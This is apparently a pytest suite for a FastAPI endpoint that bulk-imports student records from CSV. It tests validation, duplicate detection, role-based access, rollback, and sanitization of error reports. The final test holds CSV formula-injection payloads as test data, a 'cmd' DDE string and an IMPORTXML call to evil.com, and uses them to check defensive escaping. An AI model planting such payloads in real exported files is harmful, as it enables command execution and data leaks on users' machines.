"""
Comprehensive API & Integration Tests for Bulk Student Import from CSV.
Covers template download, preview validation, intra-file & database duplicate detection,
field constraints, RBAC permissions, transaction rollbacks, and CSV injection protection.
"""

import io
import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session
from app.models.user import User
from app.models.student import Student
from app.models.audit_log import AuditLog
from app.core.security import hash_password, create_access_token


@pytest.fixture
def auth_users(db_session: Session):
    """Seed test users with different RBAC roles."""
    users = {}
    for role, username in [("admin", "csv_admin"), ("faculty", "csv_faculty"), ("student", "csv_student")]:
        u = db_session.query(User).filter(User.username == username).first()
        if not u:
            u = User(
                username=username,
                email=f"{username}@university.edu",
                hashed_password=hash_password("Pass@12345"),
                full_name=f"{role.capitalize()} User",
                role=role,
                is_active=True
            )
            db_session.add(u)
            db_session.flush()
        users[role] = u
    db_session.commit()
    return users


@pytest.fixture
def admin_auth_header(auth_users) -> dict:
    token = create_access_token({"sub": "csv_admin", "role": "admin"})
    return {"Authorization": f"Bearer {token}"}


@pytest.fixture
def faculty_auth_header(auth_users) -> dict:
    token = create_access_token({"sub": "csv_faculty", "role": "faculty"})
    return {"Authorization": f"Bearer {token}"}


@pytest.fixture
def student_auth_header(auth_users) -> dict:
    token = create_access_token({"sub": "csv_student", "role": "student"})
    return {"Authorization": f"Bearer {token}"}


# ============================================================================
# 1. Template Download Endpoint Tests
# ============================================================================
def test_csv_template_download(client: TestClient):
    """Verify that the CSV template endpoint returns valid headers and sample data."""
    res = client.get("/api/v1/students/csv-template")
    assert res.status_code == 200
    assert "text/csv" in res.headers["content-type"]
    assert 'filename=student_import_template.csv' in res.headers["content-disposition"]

    content = res.text
    lines = [line.strip() for line in content.strip().split("\r\n") if line.strip()]
    assert len(lines) >= 3  # Header + 2 fictional sample students

    headers = [h.strip() for h in lines[0].split(",")]
    required = ["register_number", "full_name", "email", "phone_number", "department", "academic_year"]
    for col in required:
        assert col in headers

    # Verify fictional sample student rows
    assert "Amina Chen" in content
    assert "Carlos Ramirez" in content


# ============================================================================
# 2. Preview Validation Tests
# ============================================================================
def test_csv_preview_valid_file(client: TestClient, admin_auth_header: dict):
    """Test preview validation mode on valid student rows without DB persistence."""
    csv_data = (
        "register_number,full_name,email,phone_number,department,academic_year,semester,status,gpa\r\n"
        "PREV202601,Eleanor Vance,eleanor.v@test.edu,9876543210,Computer Science,1st Year,1,active,3.85\r\n"
        "PREV202602,Marcus Aurelius,marcus.a@test.edu,9876543211,Information Technology,2nd Year,3,active,3.90\r\n"
    )
    files = {"file": ("students.csv", io.BytesIO(csv_data.encode("utf-8")), "text/csv")}

    res = client.post("/api/v1/students/import-csv/preview", files=files, headers=admin_auth_header)
    assert res.status_code == 200
    data = res.json()

    assert data["total_rows"] == 2
    assert data["valid_rows_count"] == 2
    assert data["invalid_rows_count"] == 0
    assert data["duplicate_rows_count"] == 0
    assert len(data["preview_rows"]) == 2
    assert data["preview_rows"][0]["is_valid"] is True
    assert data["preview_rows"][0]["register_number"] == "PREV202601"

    # Verify records were NOT inserted during preview
    get_res = client.get("/api/v1/students?search=PREV202601")
    assert len(get_res.json()) == 0


def test_csv_preview_detects_intra_file_duplicates(client: TestClient, admin_auth_header: dict):
    """Test that preview mode flags intra-file duplicate register numbers and emails."""
    csv_data = (
        "register_number,full_name,email,phone_number,department,academic_year\r\n"
        "DUPREG01,Student One,unique1@test.edu,9876543210,Computer Science,1st Year\r\n"
        "DUPREG01,Student Two,unique2@test.edu,9876543211,Computer Science,1st Year\r\n"
        "DUPREG02,Student Three,same_email@test.edu,9876543212,Computer Science,1st Year\r\n"
        "DUPREG03,Student Four,same_email@test.edu,9876543213,Computer Science,1st Year\r\n"
    )
    files = {"file": ("students.csv", io.BytesIO(csv_data.encode("utf-8")), "text/csv")}

    res = client.post("/api/v1/students/import-csv/preview", files=files, headers=admin_auth_header)
    assert res.status_code == 200
    data = res.json()

    assert data["total_rows"] == 4
    assert data["valid_rows_count"] == 2
    assert data["duplicate_rows_count"] == 2

    # Row 2 should be marked duplicate
    row2 = data["preview_rows"][1]
    assert row2["is_duplicate"] is True
    assert "Duplicate register number" in row2["duplicate_reason"]

    # Row 4 should be marked duplicate
    row4 = data["preview_rows"][3]
    assert row4["is_duplicate"] is True
    assert "Duplicate email" in row4["duplicate_reason"]


# ============================================================================
# 3. Successful Import & Database Persistence Tests
# ============================================================================
def test_csv_import_success_full(client: TestClient, admin_auth_header: dict, db_session: Session):
    """Test importing a completely valid CSV file."""
    csv_data = (
        "register_number,full_name,email,phone_number,department,academic_year,semester,status,gpa\r\n"
        "CSB202601,Ada Lovelace,ada.lovelace@polytechnic.edu,9876543210,Computer Science,1st Year,1,active,4.0\r\n"
        "CSB202602,Alan Turing,alan.turing@polytechnic.edu,9876543211,Computer Science,1st Year,1,active,3.95\r\n"
        "CSB202603,Grace Hopper,grace.hopper@polytechnic.edu,9876543212,Information Technology,2nd Year,3,active,3.88\r\n"
    )
    files = {"file": ("valid_students.csv", io.BytesIO(csv_data.encode("utf-8")), "text/csv")}

    res = client.post("/api/v1/students/import-csv", files=files, headers=admin_auth_header)
    assert res.status_code == 200
    data = res.json()

    assert data["total_rows"] == 3
    assert data["imported_count"] == 3
    assert data["failed_count"] == 0
    assert data["duplicate_count"] == 0
    assert len(data["imported_students"]) == 3

    # Verify records in database
    s1 = db_session.query(Student).filter(Student.register_number == "CSB202601").first()
    assert s1 is not None
    assert s1.full_name == "Ada Lovelace"
    assert s1.email == "ada.lovelace@polytechnic.edu"
    assert s1.phone_number == "9876543210"
    assert s1.gpa == 4.0


def test_csv_import_audit_logging(client: TestClient, admin_auth_header: dict, db_session: Session):
    """Verify that an audit log record is created for bulk import without logging sensitive data."""
    csv_data = (
        "register_number,full_name,email,phone_number,department,academic_year\r\n"
        "AUDIT_REG01,Audit Student,audit.student@polytechnic.edu,9876543210,Computer Science,1st Year\r\n"
    )
    files = {"file": ("audit_batch.csv", io.BytesIO(csv_data.encode("utf-8")), "text/csv")}

    res = client.post("/api/v1/students/import-csv", files=files, headers=admin_auth_header)
    assert res.status_code == 200

    audit_entry = db_session.query(AuditLog).filter(
        AuditLog.action == "BULK_IMPORT"
    ).order_by(AuditLog.id.desc()).first()

    assert audit_entry is not None
    assert audit_entry.username == "csv_admin"
    assert "Imported 1 students" in audit_entry.new_values


# ============================================================================
# 4. File-Level Validation & Edge Cases (Empty, Oversized, Bad Extensions)
# ============================================================================
def test_csv_import_empty_file(client: TestClient, admin_auth_header: dict):
    """Uploading a 0-byte file should return 400 Bad Request."""
    files = {"file": ("empty.csv", io.BytesIO(b""), "text/csv")}
    res = client.post("/api/v1/students/import-csv", files=files, headers=admin_auth_header)
    assert res.status_code == 400
    assert "empty" in res.json()["detail"].lower()


def test_csv_import_header_only_file(client: TestClient, admin_auth_header: dict):
    """Uploading a file with only headers and no rows should return 400 Bad Request."""
    csv_data = "register_number,full_name,email,phone_number,department,academic_year\r\n"
    files = {"file": ("header_only.csv", io.BytesIO(csv_data.encode("utf-8")), "text/csv")}
    res = client.post("/api/v1/students/import-csv", files=files, headers=admin_auth_header)
    assert res.status_code == 400
    assert "no data records" in res.json()["detail"].lower()


def test_csv_import_missing_required_headers(client: TestClient, admin_auth_header: dict):
    """Uploading a CSV missing required columns should report all missing column names."""
    csv_data = "register_number,full_name,status\r\nREG01,Student,active\r\n"
    files = {"file": ("missing_cols.csv", io.BytesIO(csv_data.encode("utf-8")), "text/csv")}
    res = client.post("/api/v1/students/import-csv", files=files, headers=admin_auth_header)
    assert res.status_code == 400
    detail = res.json()["detail"]
    assert "missing required column" in detail.lower()
    assert "email" in detail
    assert "phone_number" in detail
    assert "department" in detail


def test_csv_import_invalid_file_extension(client: TestClient, admin_auth_header: dict):
    """Uploading a non-CSV file extension should be rejected with 400."""
    files = {"file": ("records.xlsx", io.BytesIO(b"dummy data"), "application/vnd.ms-excel")}
    res = client.post("/api/v1/students/import-csv", files=files, headers=admin_auth_header)
    assert res.status_code == 400
    assert "only standard csv" in res.json()["detail"].lower()


def test_csv_import_file_size_exceeded(client: TestClient, admin_auth_header: dict):
    """Uploading a file exceeding 5MB limit should return 400."""
    large_content = b"a" * (5 * 1024 * 1024 + 10)
    files = {"file": ("large.csv", io.BytesIO(large_content), "text/csv")}
    res = client.post("/api/v1/students/import-csv", files=files, headers=admin_auth_header)
    assert res.status_code == 400
    assert "exceeds" in res.json()["detail"].lower()


def test_csv_import_utf8_bom_handling(client: TestClient, admin_auth_header: dict, db_session: Session):
    """Ensure UTF-8 files with Byte Order Mark (BOM) are decoded and imported without header corruption."""
    csv_text = (
        "register_number,full_name,email,phone_number,department,academic_year\r\n"
        "BOM202601,BOM Student,bom.student@univ.edu,9876543210,Computer Science,1st Year\r\n"
    )
    bom_bytes = b"\xef\xbb\xbf" + csv_text.encode("utf-8")
    files = {"file": ("bom_test.csv", io.BytesIO(bom_bytes), "text/csv")}

    res = client.post("/api/v1/students/import-csv", files=files, headers=admin_auth_header)
    assert res.status_code == 200
    assert res.json()["imported_count"] == 1

    s = db_session.query(Student).filter(Student.register_number == "BOM202601").first()
    assert s is not None
    assert s.full_name == "BOM Student"


# ============================================================================
# 5. Database Duplicate Detection Tests
# ============================================================================
def test_csv_import_database_duplicate_register(client: TestClient, admin_auth_header: dict, sample_student: Student):
    """CSV containing a register number already in the database is flagged as duplicate."""
    csv_data = (
        f"register_number,full_name,email,phone_number,department,academic_year\r\n"
        f"{sample_student.register_number},Another Name,another.email@test.edu,9876543210,Computer Science,1st Year\r\n"
    )
    files = {"file": ("db_dup.csv", io.BytesIO(csv_data.encode("utf-8")), "text/csv")}

    res = client.post("/api/v1/students/import-csv", files=files, headers=admin_auth_header)
    assert res.status_code == 200
    data = res.json()
    assert data["imported_count"] == 0
    assert data["duplicate_count"] == 1
    assert any("already exists in the system database" in err["error_message"] for err in data["errors"])


def test_csv_import_database_duplicate_email(client: TestClient, admin_auth_header: dict, sample_student: Student):
    """CSV containing an email already registered in the database is flagged as duplicate."""
    csv_data = (
        f"register_number,full_name,email,phone_number,department,academic_year\r\n"
        f"NEWREG999,New Student Name,{sample_student.email},9876543210,Computer Science,1st Year\r\n"
    )
    files = {"file": ("db_dup_email.csv", io.BytesIO(csv_data.encode("utf-8")), "text/csv")}

    res = client.post("/api/v1/students/import-csv", files=files, headers=admin_auth_header)
    assert res.status_code == 200
    data = res.json()
    assert data["imported_count"] == 0
    assert data["duplicate_count"] == 1
    assert any("already exists in the system database" in err["error_message"] for err in data["errors"])


# ============================================================================
# 6. Row-Level Validation & Edge Cases (Parametrized Tests)
# ============================================================================
validation_error_cases = [
    # (field, invalid_value, error_fragment)
    ("email", "notanemail", "invalid email format"),
    ("email", "user@missingdomain", "invalid email format"),
    ("email", "@domain.com", "invalid email format"),
    ("email", "plainaddress", "invalid email format"),
    ("phone_number", "12345", "exactly 10 numeric digits"),
    ("phone_number", "98765432109999", "exactly 10 numeric digits"),
    ("phone_number", "phone12345", "exactly 10 numeric digits"),
    ("full_name", "A", "between 2 and 100 characters"),
    ("register_number", "R", "between 2 and 50 characters"),
    ("semester", "0", "between 1 and 8"),
    ("semester", "9", "between 1 and 8"),
    ("semester", "abc", "invalid semester"),
    ("gpa", "-0.5", "between 0.00 and 4.00"),
    ("gpa", "4.5", "between 0.00 and 4.00"),
    ("status", "unknown_status", "invalid status"),
]

@pytest.mark.parametrize("bad_field,bad_val,err_fragment", validation_error_cases, ids=[f"bad_{f}_{i}" for i, (f, _, _) in enumerate(validation_error_cases)])
def test_csv_row_field_validation_errors(client: TestClient, admin_auth_header: dict, bad_field: str, bad_val: str, err_fragment: str):
    """Parametrized verification of field-level validation errors."""
    row_data = {
        "register_number": "VAL202601",
        "full_name": "Valid Name",
        "email": "valid.val@univ.edu",
        "phone_number": "9876543210",
        "department": "Computer Science",
        "academic_year": "1st Year",
        "semester": "1",
        "status": "active",
        "gpa": "3.5"
    }
    row_data[bad_field] = bad_val

    csv_data = (
        "register_number,full_name,email,phone_number,department,academic_year,semester,status,gpa\r\n"
        f"{row_data['register_number']},{row_data['full_name']},{row_data['email']},{row_data['phone_number']},"
        f"{row_data['department']},{row_data['academic_year']},{row_data['semester']},{row_data['status']},{row_data['gpa']}\r\n"
    )
    files = {"file": ("val_test.csv", io.BytesIO(csv_data.encode("utf-8")), "text/csv")}

    res = client.post("/api/v1/students/import-csv/preview", files=files, headers=admin_auth_header)
    assert res.status_code == 200
    data = res.json()

    assert data["invalid_rows_count"] >= 1
    assert any(err_fragment.lower() in err["error_message"].lower() for err in data["error_summary"])


# ============================================================================
# 7. Authorization & Role-Based Access Control (RBAC) Tests
# ============================================================================
def test_csv_import_unauthorized_no_token(client: TestClient):
    """Anonymous/unauthenticated requests must be rejected with 401."""
    files = {"file": ("students.csv", io.BytesIO(b"dummy,header\r\n"), "text/csv")}
    res = client.post("/api/v1/students/import-csv", files=files)
    assert res.status_code == 401


def test_csv_import_forbidden_for_student(client: TestClient, student_auth_header: dict):
    """Students attempting to access administrative CSV import are rejected with 403."""
    files = {"file": ("students.csv", io.BytesIO(b"dummy,header\r\n"), "text/csv")}
    res = client.post("/api/v1/students/import-csv", files=files, headers=student_auth_header)
    assert res.status_code == 403
    assert "access denied" in res.json()["detail"].lower()


def test_csv_import_forbidden_for_faculty(client: TestClient, faculty_auth_header: dict):
    """Faculty members without administrator privileges are rejected with 403."""
    files = {"file": ("students.csv", io.BytesIO(b"dummy,header\r\n"), "text/csv")}
    res = client.post("/api/v1/students/import-csv", files=files, headers=faculty_auth_header)
    assert res.status_code == 403
    assert "access denied" in res.json()["detail"].lower()


# ============================================================================
# 8. Partial Import vs. All-or-Nothing Transactional Rollback
# ============================================================================
def test_csv_import_allow_partial_true(client: TestClient, admin_auth_header: dict, db_session: Session):
    """With allow_partial=True, valid rows are imported while invalid/duplicate rows are skipped."""
    csv_data = (
        "register_number,full_name,email,phone_number,department,academic_year\r\n"
        "PARTIAL_OK1,Good Student One,good1@univ.edu,9876543210,Computer Science,1st Year\r\n"
        "BAD_ROW,X,not-an-email,123,CS,1st Year\r\n"  # Invalid
        "PARTIAL_OK2,Good Student Two,good2@univ.edu,9876543211,Computer Science,1st Year\r\n"
    )
    files = {"file": ("partial.csv", io.BytesIO(csv_data.encode("utf-8")), "text/csv")}
    data = {"allow_partial": "true"}

    res = client.post("/api/v1/students/import-csv", files=files, data=data, headers=admin_auth_header)
    assert res.status_code == 200
    res_data = res.json()

    assert res_data["total_rows"] == 3
    assert res_data["imported_count"] == 2
    assert res_data["failed_count"] == 1
    assert len(res_data["errors"]) >= 1

    # Verify database has the 2 good students
    s1 = db_session.query(Student).filter(Student.register_number == "PARTIAL_OK1").first()
    s2 = db_session.query(Student).filter(Student.register_number == "PARTIAL_OK2").first()
    assert s1 is not None
    assert s2 is not None


def test_csv_import_allow_partial_false_aborts_all(client: TestClient, admin_auth_header: dict, db_session: Session):
    """With allow_partial=False, any invalid or duplicate row aborts the whole import (atomic rollback)."""
    csv_data = (
        "register_number,full_name,email,phone_number,department,academic_year\r\n"
        "ALL_FAIL1,Should Not Be Added,shouldnot1@univ.edu,9876543210,Computer Science,1st Year\r\n"
        "BAD_PHONE,Fails Here,badphone@univ.edu,12345,Computer Science,1st Year\r\n"
    )
    files = {"file": ("all_or_nothing.csv", io.BytesIO(csv_data.encode("utf-8")), "text/csv")}
    data = {"allow_partial": "false"}

    res = client.post("/api/v1/students/import-csv", files=files, data=data, headers=admin_auth_header)
    assert res.status_code == 400
    assert "partial imports are disabled" in res.json()["detail"].lower()

    # Verify that NONE of the students were persisted in the database
    s = db_session.query(Student).filter(Student.register_number == "ALL_FAIL1").first()
    assert s is None


# ============================================================================
# 9. CSV Injection Defense in Generated Error Report
# ============================================================================
def test_csv_error_report_sanitization(client: TestClient, admin_auth_header: dict):
    """Ensure that error reports sanitize dangerous formula prefixes (=, +, -, @, \\t, \\r)."""
    error_payload = {
        "errors": [
            {
                "row_number": 2,
                "register_number": "=cmd|' /C calc'!A0",
                "full_name": "+@SUM(1,1)",
                "email": "-malicious@domain.com",
                "error_message": "@IMPORTXML('http://evil.com/leak')",
                "is_duplicate": False
            }
        ]
    }
    res = client.post("/api/v1/students/import-csv/error-report", json=error_payload, headers=admin_auth_header)
    assert res.status_code == 200
    assert "text/csv" in res.headers["content-type"]

    csv_body = res.text
    # Dangerous formula characters must be prefixed with single quote
    assert "'=cmd|" in csv_body
    assert "'+@SUM" in csv_body
    assert "'-malicious" in csv_body
    assert "'@IMPORTXML" in csv_body
